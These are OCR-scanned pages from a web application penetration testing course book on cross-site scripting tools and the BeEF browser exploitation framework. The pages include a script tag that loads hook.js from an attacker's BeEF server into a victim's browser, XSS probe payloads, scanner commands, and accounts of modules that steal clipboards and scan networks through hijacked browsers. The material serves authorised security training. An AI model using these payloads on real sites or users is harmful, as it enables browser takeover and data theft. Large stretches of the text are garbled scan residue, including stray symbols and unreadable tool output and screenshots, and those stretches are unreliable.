'---' 
Please go to Exercise 4.3 in the 542 Workbook. 
,_,. 
'-' 
'-../ 
'-' 
'-' 
'---' 
'-../ 
'---' 
. ..__,, 
'---' 
'-../ 
'-' 
'---' 
'-' 
'-' 
'-../ 
\___./ 
94 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
· Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
XXEandXSS 
1.XXE 
l. Exercise: XXE 
J. Document Object Model (DOH) 
4. Cross-Site Scripting (XSS) Primer 
S. Classes of X:SS 
6. Exercise: XSS 
ss 
9. Exercise: HTML Injection 
I 0. XSS Tools 
IL BeEF 
12.Exercise:BeEF 
13.AjAX 
14. API Attacks 
15. Data Attacks 
16. Exercise: AJAX XSS 
17. Summary 
Course Roadmap 
We will next discuss applying some tools to our interacting with XSS flaws. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
95 
'-.../ 
\.....i 
"-' 
• The ubiquity and varied nature of XSS flaws warrant wielding 
multiple tools effectively 
• Naturally, our general-purpose interception proxies, as always, 
can afford us some capabilities 
• Focused and capable XSS-only tools can complement our proxies: 
oXSSer 
oxsssmper 
oXSScrapy 
\.....i 
'--' 
'----' 
'----' 
'--' 
'----' 
'-.../ 
'----' 
'----' 
,_.,, 
'----' 
'--' 
'--' 
'--' 
As previously discussed, Cross-Site Scripting represents a pernicious flaw found with tremendous regularity on 
all manner of web applications. Although we will employ interception proxies, more focused XSS-specific tools 
can also prove quite useful in finding these flaws. 
We explore XSSer, xsssniper, and XSScrapy as potential boons to the discovery ofXSS flaws. 
96 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
\.....i 
\....,/ 
\.....i 
\.....i 
'--' 
'--' 
'----' 
'----' 
'----' 
'----' 
'--' 
'-.../ 
'--' 
'----' 
\.....i 
'----' 
'-./ 
\.....i 
'-..../ 
'-..../ 
'-..../ 
'----' 
'-..../ 
\J 
\.....i 
\.....i 
Interception Proxies 
• Interception proxies such as Burp or ZAP play a significant role in 
our manual discovery and verification of XSS flaws 
• In particular, the proxies can facilitate fuzzing various aspects of 
the web application 
• Naturally, any injectable parameters exposed in the interception 
proxy will be targeted 
• However, other less obvious locations might also be vulnerable: 
o User-Agents, Cookies, HTIP Headers, Referer 
Interception proxies naturally play a primary role in the manual discovery and verification ofXSS flaws. They 
prove particularly useful in allowing for thorough fuzzing of all aspects of the web application. Although there 
are browser extensions that can provide a simple-to-use means to testing for XSS, they fall short on fully 
assessing the various inputs exposed via the application. 
With Burp or ZAP, our interception proxies of-choice, we can perform fuzzing against the application with a 
goal of discovering XSS flaws. Any injectable parameters or form fields identified by the proxy can serve as 
prime targets. However, more than just these inputs need to be assessed. Effectively, everything we submit can 
be thought of as input to the application and potentially in scope for assessment. Practically, some elements are 
more likely to be of use than others. 
Some examples of input that could potentially be relevant to XSS that might not appear as obvious injection 
points are User-Agents, cookies, session tokens, custom HTTP headers, HTTP referer, and so on. 
Note: The misspelling of "referer" is per the RFC, as noted at http://tools.ietf.org/html/rfc2616#section-14.36 
(https://cyber.gd/542 _ 418). 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
97 
'-----' 
'-....J 
'-....J 
Burp Intruder: Reflection Tests 
• Burp Intruder can be particularly effective at assisting with manual or fuzzed 
XSS reflection tests 
• Battering Ram: An attack type in Burp Intruder that submits one payload 
at multiple positions simultaneously 
• Grep Payloads: An option in Burp Intruder that searches the application's 
responses for the submitted payload 
• Battering Ram + Grep Payloads: Enables us to simultaneously fuzz 
multiple injection points per request to see if any of them are found in a 
response 
• Follow up with a Burp Intruder attack type of Sniper to determine which 
injection point yielded the reflection 
'-" 
'-.J 
'-.J 
'-.J 
'-.J 
'-.J 
'-.J 
'-.J 
'-.J 
'-----' 
'-.J 
'-.J 
'-' 
'-----' 
As with all input or injection flaws, Burp Intruder's fuzzing capabilities can prove extremely helpful with XSS 
fuzzing. Leveraging the approach discussed previously, we can start by focusing first on tests for reflection. The 
goal is to identify any possible entry points that could yield reflection. 
Our Burp Intruder workflow first employs the Battering Ram attack type coupled with Grep Payloads. If the 
results suggest potential reflection, then we can follow up with using the Sniper attack type to determine which 
individual injection points resulted in reflection. 
'-.J 
'-" 
'-.J 
'-' 
'-' 
'-' 
'-.J 
'-' 
'-.J 
'-.J 
'-' 
'-----' 
'-.J 
'-----' 
,.._j 
'-' 
'-.J 
'-' 
'-.J 
'-.J 
'-.J 
'-" 
'-.J 
98 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-----' 
'-..../ 
Battering Ram 
Repeater sequencer. oecceer comparer 
One great aspect of using Burp Intruder is that we are not limited by where we can attempt injection. With Burp 
Intruder, it is just another position that can be set. 
The screenshot shows selecting the Battering Ram attack type. This is found on the Positions tab of Burp 
Intruder. As shown, we have also selected five different positions (or injection points). 
The injection points highlighted above include: 
• 
URL parameter 
HTTP User-Agent 
• 
HTTP referer 
And two different HTTP cookies 
Because we leverage the Battering Ram attack type, each of these injection points will simultaneously be 
replaced with the payload of our choosing. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
99 
'-' 
'-' 
Grep: Payloads 
- 
result items rr., .. h,.iinih,n reflections of the 
for Po1m,,n, 
case sensitive match 
Exclude HTTP headers 
Match 
'-' 
'-' 
\..J 
\..J 
'-' 
\..J 
\..J 
\..J 
\..J 
\..J 
\..J 
'-' 
'-...,I 
\..J 
An aspect of Burp Intruder that matches perfectly our goal of finding reflected input is found under the Options 
tab of Burp Intruder. Specifically, we are interested in the Grep - Payloads option. This technique has Burp look 
in the response traffic for the payloads that we inject. 
So, ifwe inject 42424242, then Grep - Payloads will look within the responses for evidence of that string. This 
means we can easily look for reflected input. 
100 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-...,I 
'-..., 
\..J 
\..J 
\..J 
\..J 
\..J 
\..J 
\..J 
\..J 
\..J 
\....., 
\..J 
\....., 
'-' 
\..J 
\..J 
\..J 
\..J 
\..J 
\..J 
\.....; 
\..J 
\.....; 
\....., 
\..J 
Initial Reflection Test Results 
Attack S3...e columns 
</p~~><l~d></t(> 
<t.t'><td R.1tt.J.ect ed.Y.SSt.xP.tcUt- .i,.on.Poi nt.'111'"" l ft class• "non-\n;app j. ng- l@e .!, "> Co~kie 
.PlfPSESSID<J t.d> <td>:JJ.-2124.24~/pre></ td> <./tr>-< u: > s<t-.d Reflect edXSSEX'ec ut-io-nPo int"" n l n 
c lcJess~"non-•,r 41>1' 1 ng-lal>" l ">Cookie sh.,,.lunt$</ t d><t.ct> 42424242</ !)re></ td></ tr> 
</r:,11bl .. >- 
t ? j N ["+-, I~ 42424242 
IOI 
This screenshot shows the results of our simple Battering Ram+ Grep Payloads intruder run. Notice the P grep 
column. That column exists because we selected Grep Payloads. A check box indicates that our payload, in this 
case, 42424242 was found in the response traffic. 
Performing a search of the response shows that our string in question actually occurs six times in the response 
traffic, even though we injected it in only five locations. While given the relatively small number of entries, we 
could step through this, but if we were injecting in many more places, stepping through could prove 
cumbersome. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
101 
'-'. 
'-· 
Follow-Up•• Sniper Attack 
'--' 
Rather than stepping through each of the reflections from the Battering Ram attack, we can circle back to Burp 
Intruder. This time, we will hit all the same positions, with the same payload, but leverage a Sniper attack type 
rather than Battering Ram. With Sniper, only one position can be targeted at a time, which means that each of 
our five positions will be injected in separate requests. Again, looking to the P grep column, we can find which 
requests, and therein positions, resulted in input being reflected back into the response. 
'-J 
'-J 
'-J 
'-J 
'---' 
'--./ 
'-._.,., 
'-J 
'-J 
\,__.,, 
'-._.,., 
'-J 
'-._.,., 
'-J 
'-._.,., 
'-J 
'-./ 
'-J 
'-' 
'-J 
'-J 
'-J 
'-J 
'-.,,' 
'-._.,., 
'-./ 
'--' 
'-.,," 
.'---" 
'--' 
'-J 
'--./ 
'-J 
'-J 
'--' 
'-J 
'--/ 
102 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'-./ 
xsssniper 
• Gianluca Brindisi (@gbrindisi) developed the Python-based 
xsssniper in an attempt to automate Reflected XSS testing 
• This simple-to-use tool provides a quick means for basic Reflected 
XSS testing of known URLs 
o Also can perform spidering with an eye to XSS discovery 
• The following simple xsssniper syntax would scan the target 
URL, spider for additional URLs, and also inject against any 
forms discovered 
$ xsssniper -u "http://sec542.org" --crawl --forms 
SEC542. jWeb App PenetrationTesting and Ettiical Hacking 
101 
A simple-to-use XSS vulnerability discovery tool is xsssniper from Gianluca Brindisi. The tool is written in 
Python and employs some simple command-line switches to guide the discovery of Reflected XSS vulnerabilities. 
Although xsssniper can directly target a specific URL, it can also work as an XSS spider to crawl the site to 
uncover additional potential inputs. 
Gianluca Brindisi's blog post introducing xsssniper is available at: http://brindi.si/g/blog/introducing- 
xsssniper.html (https://cyber.gd/542_ 47). The GitHub project page is here: 
https://github.com/gbrindisi/xsssniper (https://cyber.gd/542_ 45) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
103 
~ 
$ xsssniper -u "http://mutillid.ae" --crawl 
--forms --http-proxy 127.0.0.1:8082 
b 
do Ass.as. .dasae . 
. Bb ds· 85' YP sa• 
YP 
·abet&" 
~abu. 
·aoo. 
• dPYl;I. 
'Y$b. 
'V$!L 
.SP ¥8 .. db 
so db 
an 
l'(P 
YI'> '$SM¥ 1 '·ffSa&-Y' 
• · ., l ver~ii;u:, (I. 9 
.ssaaa. dab 
db dSa.s.saati. d88i6:t. uaaassb desssb. 
es· 
YP a~lk.! ea 
-ae- 
ea 
·eo aa- 
a-& 
·ao 
0800. 
8!1\<$1;) '88 
a& 
a&OQIJO' 6~ 
!UJoobY' 
·vm.1. ea vaosa 
sa 
JJ$- as:~---- BS:'Sb 
1b 
so ss vesa 
Asa. 
aa 
a. 
ea ·sa:. 
'$8$$'{' V? 
VSP Yta -&IWS ? 38 
YUM&P U 
YO 
<,i,.mluc.a Sriwt.s1 ~rinQi, SP J • • • • 
http://brind1.d/{J/ 1 •· ·- 
f Scam·dng taf9ets ·•'ithuut prior iwti.ml Cilnsent is, i\l.tj~C It h tl"'.t eJW 
! 
f user ts rel;xin~ibllity ta obey :alt appH<:abl~ tecat , state ~ind teeerat l~s. 
! 
! N.lthors -'H!JIJ.¢ oo liability and ere not; rt:;sx,risitl'l<!! for ~J)Y euscse t,:r- 
! 
I da.ma9e ,;aused by thti progr&li. 
1 
(+cJ TAA!J:ff: http://JWtil.tidae 
I • MtfH®: GET 
f• PROXY~ ll7,8.G.l:2'tl$2 
t•) cn,·~ling Unk_s ... 
t • SIX'.tE:$5: found ll unique t;:,rg~t>. 
[-i,) CrawU.w; for for/is.,, 
I·· R~ifllng targets; l j» l•l OVW.'t. l!Mal\SI 
J 
t· i&:11:: 4!}4, 
f· W>i-RIHM; N(l, teres found. 
l+I Stan scmmin9 n tbreedsj 
J~ Remaining url.~; l 
J· seen t'Mi)let:ea tn ?.4,7J:U¾2RSl72 seccnas , 
£,J-.J ProcfHing resul.ts • 
f• Done. 
(+) RfSlli..·s: t>ounrl XSS lnjttt"ion poi.nts in -... ta 
SEC542 ! Web App Penetration Testing and Ethical Hacking 
HM 
\._.,, 
~ 
'---' 
~ 
'-..../ 
~ 
~ 
'---' 
'---' 
~ 
'-..../ 
'-..../ 
'---' 
'---~ 
'-' 
'-..../ 
'-..../ 
Here is an example xsssniper command line: 
'-' 
'-' 
$ xsssniper -u "http://mutillidae" --crawl --forms --http-proxy 
127.0.0.1:8082 
Let's break down this command: 
Xsssniper: Running the tool itself. 
-u "http:/ /mutillidae": Providing a target starting point; in this case, our local Mutillidae install. 
--crawl: Indicating that xsssniper should crawl the site to discover additional entry points. 
--forms: xsssniper should look for injectable forms to target. 
--http-proxy 127. 0. 0 .1: 8082: Run the tool through a proxy; in this case, our local Burp install. 
The screenshot provides an output of xsssniper having been run against our local installation of Mutillidae. 
104 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
-.._./ 
___.,, 
'-' 
'---' 
'-...; 
'-' 
'-./ 
~ 
'-../ 
'-...; 
'---' 
'-../ 
~ 
'---' 
'-./ 
'-" 
'-...; 
XSSer 
• Another purpose-built XSS discovery tool written in Python is XSSer 
• XSSer provides both a command line and GTK GUI interface: 
o The GTK provides a wizard of sorts to attempt to guide the attacker through building an 
XSS discovery campaign, but can be unwieldy 
• Includes a switch that tries to determine filtering employed by the 
application (--heuristic) 
• Provides a number of bypass techniques that can be employed 
o (for example, --Hex, --Dec, and--Une) 
• Like xsssniper, XSSer can be pointed at a local proxy of your choice 
o (--proxy) 
< SEC542 l Web App Perietration Testlrlg and Eth\cal Hacking 
XSSer1 is a Python-based tool developed to aid the discovery and exploitation ofXSS vulnerabilities. One difference 
with XSSer compared to most other tools is that XSSer includes a GTK-based GUI that can be leveraged to guide 
the building of the attack. The GUI can be a bit unwieldy and has some awkward use of the English language. 
However, it can provide a relatively quick way to discover some of the various options that XSSer offers to the pen 
tester. 
One key command-line switch that can prove useful is the --heuristic switch. The purpose of this switch is to 
identify characters that are filtered by the application. This can be useful in guiding future exploitation that requires 
filter bypass or evasion. 
Along those lines, XSSer provides a number of different options that can be used to attempt filter bypass or evasion 
directly. Some examples include: 
• 
Hexadecimal encoding (--Hex) 
• 
Decimal (--Dec) 
• 
String.FromCharCode() 
• 
Unescape() (--Une) 
In addition to bypass or evasion, XSSer can also attempt XSS discovery and exploitation using "special techniques." 
Selectable options exist to have XSSer attempt to discover XSS flaws via: 
• 
HTTP User-Agent 
• 
HTTP Referer (sic) 
• 
HTTP Cookies, as well as others 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
105 
'--' 
'--' 
One additional feature ofXSSer is that a fairly substantial, and somewhat unique, list of potential XSS payloads2 
is provided by the tool author (available in the Security542 VM at /opt/xsser/core/fuzzing/vectors.py). Although 
the list has not seen a tremendous number of recent updates, it can still provide an additional source of potential 
injection payloads to employ. 
Reference: 
[I] http://xsser.03c8.net/ (https://cyber.gd/542 _ 431) QR 
[2] Ibid. 
'--' 
'-.../ 
'--.,/ 
'--.,/ 
'--.,/ 
'----" 
'--.,/ 
'----" 
.___,, 
'----" 
'----" 
'--.,/ 
'--.,/ 
'--.,/ 
'----" 
'--.,/ 
'--.,/ 
'----" 
'----" 
'--.,/ 
'--' 
'--.,/ 
'--' 
'--.,/ 
.___,, 
.___,, 
.___,, 
'--' 
'--' 
.___,, 
'--.,/ 
'--.,/ 
'----" 
'--' 
'--' 
'-----' 
'-../ 
106 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-../ 
'-...,· 
XSScrapy 
• XSScrapy is a recent XSS spider written in Python by Dan Mclnerney 
(@DanHMcinerney) 
• Magic reflection injection string: 9zqjx 
o This string is used to try to discover potentially reflected input and locate where within the 
source the string exists 
• Depending upon the location, XSScrapy will employ one of the following 
three injection payloads: 
o '" () =<x> 
o'"(){}[]; 
o JaVAscRIPT :prompt (99) 
• XSScrapy can prepend and append the payload with 9zqjx 
SEC542 j Web AppPenetratlon Testing and .Ethical Hacking 
101 
A great tool for discovering Reflected XSS vulnerabilities has been created by Dan Mclnemey. XSScrapy, a 
Python-based XSS spider that leverages Scrapy, employs some interesting tactics that can greatly improve the 
speed and fidelity ofXSS discovery. 
XSScrapy takes a decidedly different, and more efficient, approach to XSS discovery than most tools. Rather 
than focusing on leveraging a bigger, cooler, more evasive set ofXSS injection payloads, XSScrapy simply 
starts by looking for evidence of reflection of innocuous input. At present, XSScrapy uses the input 9zqjx as its 
magic injection string. After injecting this string in various places, XSScrapy leverages its spidering capabilities 
to discern whether, and more importantly, where 9zqjx is found in the response traffic. 
By focusing on the location ofreflection within the HTML, XSScrapy increases the likelihood of finding 
exploitable XSS flaws. When the reflected input is discovered, the tool injects one of three different payloads to 
determine successful injection and filtering employed by the application. 
By focusing on innocuous reflection and following it up with crafted payloads to determine filtering and 
injection efficacy, XSScrapy typically has a reduced incidence of false positives. 
XSScrapy is available from https://github.com/DanMcinemey/xsscrapy (https://cyber.gd/542_ 410) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
107 
'--' 
\,_.; 
Reflected POST 
Inducing users to send a GET request via clicking a link or fetching a resource 
is fairly straightforward 
• Methods of tricking a user to POST according to our needs is less obvious 
Perhaps a bit more challenging, but certainly not unachievable 
Before going down this path though, do ensure to check if the target in question 
supports parameters being passed as query parameters 
• Even if the typical approach involves POST payload, URL query parameters might still be 
accepted, even if atypical for the site 
Hosting our own HTML forms on a site we control provides the most obvious 
approach 
• Hidden automatically submitting HTML forms can work well 
\,_.; 
'--' 
'-../ 
'--' 
'---" 
'--' 
. .___,, 
'-" 
'-" 
'--./ 
'-" 
'-" 
'--./ 
'-" 
While there is still nuance in successfully delivering links to target users and having them click or otherwise 
carry out the request, the basic idea is pretty obvious. Emailing the standard form of the link might not be the 
coolest or most professional seeming method ofXSS delivery, but it can still prove effective. 
'-" 
'-../ 
'-" 
.,___,, 
'--' 
'---" 
'-" 
'-" 
'-" 
'-" 
'-" 
'-./ 
'-" 
'--' 
.___,, 
'-" 
'-" 
'-" 
'-" 
'-./ 
'-' 
'-" 
'-' 
'-' 
108 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'-./ 
GET -> POST XSS Flaws 
HTTP POST method does not use the URL for parameters 
• This makes XSS harder to demonstrate with a link 
get2post. py from Mark Baggett (@MarkBaggett), GSE #15 and 
author of SEC573, allows us to use a demo link, passing it the target 
and POST payloads as URL parameters 
• Run getzpost, py on an accessible server we control 
• The GETified URL will use the target parameter for redirection 
• Additional query parameters become POST payloads 
109 
GET makes it easy to demonstrate and social engineer XSS flaws. Parameters are conveniently passed via the 
URL. 
There is no such luck with an HTTP POST request. Variables live in the payload of the request. Although POST 
requests certainly still exhibit XSS vulnerabilities, attacks can be harder to demonstrate and weaponize as is. 
Mark Baggett (@MarkBaggett), GSE #15 and author of SEC573: Python for Penetration Testers provides 
get2post.py to help us get back to the lovely demo link we all love so much. 
Run/host this as needed on an accessible server. 
get2post.py is available at: https://github.com/Mark8aggett/Mark8aggett/blob/master/get2post.py 
(https://cyber.gd/542_ 429) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
109 
'----' 
,_, 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
XXE·andXSS 
LXXE 
2.. Exercise: XXE 
3. Document Object Model (DOM} 
4. Cross-Site Scripting {XSS) Primer 
S. Classes of XSS 
6. Exercise: XSS 
7. Discovering XSS 
8. XSS impacts 
9. Exercise: HTML Injection 
I 0. XSS Tools 
II. BeEF 
I 2. Exercise: BeEf 
13.AjAX 
14. API Attacks 
I 5. Data Attacks 
16. Exercise: AJAX XSS 
17. Summary 
SEC542 I Web App Penetration Testing and Ethical Hacking 
110 
'----' 
\...., 
'-.J 
\...., 
'-../ 
"--- 
'-....- 
''-" 
'-....- 
'-.J 
'-....- 
'-../ 
'--.J 
.__, 
.__, 
'-.., 
Course Roadmap 
.__, 
'-../ 
Next up: The awesome Browser Exploitation Framework (BeEF). 
110 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-../ 
..._.. 
'-./ 
'-../ 
'-../ 
.__, 
.__, 
'-../ 
'-../ 
'-....- 
'-../ 
'--" 
'--" 
'--" 
'--' 
'--" 
''--' 
'-....- 
'-....- 
BeEF 
• Browser Exploitation Framework: 
o By Wade Alcorn 
• Powerful framework due to the 
interprotocolfeatures 
• Focuses on payload delivery 
• Current stable version is Ruby: 
o Older PHP still common 
-- 
--- 
,.j;-~ 
_, llki!','! 
1•ArR~-lf -- 
....... ~ 
~~·~ 
·~~ 
• ..,,.,,.,_._ 0 
,...,,._ 
.......... 
........ , .. 
ll'liiop',tt ... ~ 
·--- 
--· 
'- ........ 
i-~- 
~-~·- ...... 
-~-i....,. 
·- 
.--K~ 
·--AA-f-~ 
........ , .. ,11..i 
-~~ .... 
~,¥#, 
,.,. 
.. 
......._ 
.... 
,.__. . 
..... ~ 
=--=- 
.:--• -- 
-.., ..... 
, ...... 
llflili;• ... .w• 
.. ~ 
SEC542 fWeb App Penetration Tes_nng and E 
111 
BeEF is a framework for building attacks. These attacks are then launched from the browser. BeEF enables the 
attacker/developer to focus on payloads instead of how to get the attack to the client. 
This screenshot is of the BeEF control interface. On the left side, you can see the menu options and the list of 
zombies under this attacker's control. On the right are the panes that show the command you want to run and the 
results from this command. 
Reference: 
BeEF is available from http://beefproject.com/ (https://cyber.gd/542 _510) QR. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
111 
'--' 
'--' 
.____,,, 
BeEF. Interface 
• The various panels control the victim 
browsers 
• Zombies are listed as offline or online: 
o If offline, commands are sent when the 
browser reconnects 
• Module descriptions are to the right: 
o Also, where the module config appears 
• More menu options can be accessed by 
right-clicking 
• The color of the icon determines if the 
module runs on the victim 
•J 
· Works on the victim 
· Works but may be visible 
· Not confirmed to work 
· Doesn't work 
'-' 
.____,,, 
.____,,, 
\__.; 
'--' 
'-.../ 
'--' 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'--' 
'--' 
The BeEF interface is controlled via a web interface. This interface provides a series of panels to interact with 
the pieces we need for our exploitation. 
The first panel is a list of the zombie browsers, both the ones offline and online. For the offline ones, BeEF 
caches the commands and issues them when the browser reconnects! 
The next panel is a list of modules available. Each module is color coded based on the zombie selected. This 
color coding signifies the reliability and functionality of the module against that target. When we select a 
module, the panels to the right will list the description and the configuration options. We can then click the 
Execute button to send the command to the browser victim. 
112 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'-.../ 
'--' 
.__/ 
'--' 
'-.../ 
'--' 
'-.../ 
.____,,, 
'--' 
'-.../ 
'-.../ 
'--' 
'-.../ 
'-.../ 
v· 
Zombie Control 
D ses hook.js to hook the browser: 
<script 
src=http://beefserver:3000/hook.jsX/script> 
Inject this script via an XSS attack 
• It is the payload of the exploit 
This file connects the victim to the BeEF controller 
• The BeEF controller changes the JS based on commands issued 
We then use the various modules to control the zombie 
• Or redirect the victim to a Metasploit server 
SEC542 f Web App Penetration Testing and Ethical Hacking 
Ill 
When we want to use BeEF to control a zombie browser, we inject the hook.js file via an XSS flaw. When the 
victim loads the page with the exploit, his or her browser is connected back to the BeEF controller. The pen 
tester can then issue commands back to the victim browser. This is done through the hook.js file, which is 
changed based on the commands we want to send. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
113 
'-...,I 
'---" 
BeEF Functionality 
The BeEF framework contains numerous command modules that 
utilize powerful API: 
• These modules provide the various attacks against the zombie machines 
Multiple modules available: 
• Clipboard Stealing 
• History Browsing 
• Port Scanning 
• Browser Exploits 
• Interprotocol Exploitation 
BeEF 
SECS42 I WeoApp Penetration Testing and Ethi<:al Hacking 
11.; 
\._,/ 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-J 
'-" 
'-' 
'-J 
'-" 
'-...,I 
'-J 
BeEF contains the following capabilities: 
• 
Controlling Zombies 
• 
Modules 
• 
Autorun 
• 
Clipboard Stealing 
• 
JavaScript Injection 
• 
Request Initiation 
• 
History Browsing 
• 
Port Scanning 
• 
Browser Exploits 
• 
lnterprotocol Exploitation 
'-' 
'-...,I 
'-J 
'-' 
'-' 
'-J 
'-J 
'-' 
'-J 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-" 
'-...,I 
'-' 
'-.../ 
'-' 
114 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
History Browsing 
• This module retrieves browser history 
• Uses brute force techniques 
• We must provide a list to BeEF 
o It has a few sites by default 
• Enables us to target users and sites 
SEC542 jWebApp Penetration Testing andeEthical Hacking 
11s 
This module sends a list ofURLs to the zombie and then returns if that client has accessed them. As we 
discussed earlier today, this capability enables us to fingerprint the victims, map their infrastructure, and 
determine potential sites to use in other attacks. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
115 
'---' 
'--' 
'--' 
Request Initiation 
• Module to send HTTP requests 
• Victim browser makes the request as directed 
• Excellent for CSRF attacks 
• This module does not return page content to the attacker 
'---' 
'--' 
'---' 
'---' 
'-...,/ 
'---' 
'-...,/ 
'---' 
'---' 
'---' 
'---' 
'-.../ 
This module directs the zombie to request a page. This could be used to download software to the machine. It 
could also be used to send the client to a specific site, either to click ads for revenue or to perform a DoS attack 
by overwhelming the web server with requests. 
.'-" 
'-" 
'---' 
'-.../ 
'-" 
'-...,/ 
'-...,/ 
'-" 
'-...,/ 
.._,, 
.._,, 
'-" 
'-.../ 
'-" 
.._,, 
'---' 
'-...,/ 
.._,, 
'-" 
.._,, 
.._,, 
'-...,/ 
'-.J 
'-...,/ 
116 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'--' 
Port Scanning 
• Port scan a network through the zombies 
• Quickly map a network 
• Distributed across zombies to lower risk of detection 
• Stealthy with enough zombies 
SEC542 JWeb App Penetration Testing and E 
BeEF includes an interesting port scanner, which can conduct network port scans using distributed zombies. 
This means that with enough zombies, the attacker could have each one request a single port. What IDS is tuned 
to catch that?! 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
117 
'--" 
'---' 
'--' 
" 
BeEF now supports integrating with Metasploit 
• This requires a running copy of Metasploit 
• Reachable by the BeEF server 
BeEF injects an iframe into the victim to deliver a 
browser exploit 
• Also supports AutoPWN, which is not recommended 
•veG~~ 
lt/l!Ge! P!-a!H~,$ 
0 C.etR~ 
Keys 
.i :;:3tPS::(4l 
~~ {P0$1)\'j 
~ fmdlihe1 ~ } 
-ti:K:; 
1lll'~Mlli!C- 
'~J!~J)!Olit{Oi 
.i9Mi1le(3j 
J'ram,,F1re;irt~ 
wl¾c!l}'Theli 
.;,r R.w;, Ja-,aSct1f!l 
A <;;J NIW'M>rn (7) 
ONS~ru.m\ 
Oe!!lie! Socilll ~ks 
Oetertio, 
~~Swttp 
;,r>ortSc- 
• !'~pm Htt,.S)lit 
'--' 
'-./ 
'-./ 
In current versions of BeEF, the capability to connect with Metasploit has been added. The BeEF controller 
connects to Metasploit via an RPC connection and loads the available exploits and payloads. We can select the 
attack to deliver, and BeEF injects an iframe pointing to the Metasploit attack. BeEF does enable us to use the 
Metasploit Browser AutoPWN, which delivers every exploit until access is gained. This is not recommended 
because it isn't stable and can cause issues during a test. 
\.J 
'-./ 
'-./ 
'-./ 
'---" 
'---" 
'-./ 
'---" 
'-" 
'-J 
'-J 
'---" 
'-" 
'-./ 
\.J 
"---' 
'--" 
'-" 
'---" 
'-J 
'-..../ 
'-'' 
'-..../ 
'-..../ 
'---' 
'--" 
'--" 
'-./ 
'-./ 
'-" 
'-..../ 
"---' 
'-..../ 
'---" 
'-../ 
118 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'-..,- ' 
lnterprotocol Exploitation 
Many protocols are forgiving 
• They ignore "junk" 
• HTTP Request headers are often 
considered junk! 
BeEF enables exploitation across 
protocols 
• From a hooked browser running 
attacker's scripts, we can direct 
HTTP requests to target servers 
• Payload of HTTP request is a 
service-side exploit, to be delivered 
from hooked browser to target 
server (possibly on intranet) 
BeEF injects a BindShell as an exploit 
payload 
Pen tester interacts with the shell 
• Through BeEF controller 
application 
• Controller runs on pen tester's 
server 
Attackers can use BeEF to communicate and exploit other protocols. For example, BeEF contains the module to 
communicate and exploit an Asterisk Vol P server. It can communicate with a wide variety of services, and it is 
simple to port Metasploit exploits to BeEF. 
Many protocols are forgiving in regard to understanding the requests coming from clients. Because of this 
forgiveness, BeEF can abuse this forgiveness. BeEF sends HTTP requests that contain the various protocols in 
the payload. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
119 
'-' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
XXEandXSS 
LXXE 
2. Exerdse: XXE 
3. Document Object Model (DOM) 
4. Cross-Site Scripting (XSS) Primer 
5. Classes ofXSS 
6. ExerdSe, XSS 
7. Discovering XSS 
8. XS$ Impacts 
9. Exercise: HTML lnjectim, 
10. XSS Tools 
II. BeEF 
12. Exercise: BeEF 
13.AJAX 
14. API Attacks 
I 5. Data Attacks 
16. Exercise: AJAX XSS 
17. Summary 
SEC542 I Web App Penetration Testing and Ethical Hacking 
120 
'-' 
'-.J 
'-.J 
'--" 
'-' 
'--" 
'-' 
'-" 
'-' 
'-.J 
'--" 
'-' 
'-' 
'-' 
'-' 
'-.J 
'-' 
Course Roadmap 
'-' 
'-' 
Let's use BeEF hands-on. 
'-' 
'-' 
'--" 
' '-' 
'-' 
..___.. 
'-' 
.._, 
.._, 
'--" 
'-' 
'--" 
'-' 
.'-' 
'-' 
'-' 
'-' 
'-' 
120 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
.._,- 
t 
SEC542 Workbook: BeEF 
~ -=- 
Exercise 4.4: BeEF 
SEC542 l Vo\'eb App Penetration Testing and E 
121 
SEC542 Workbook: BeEF 
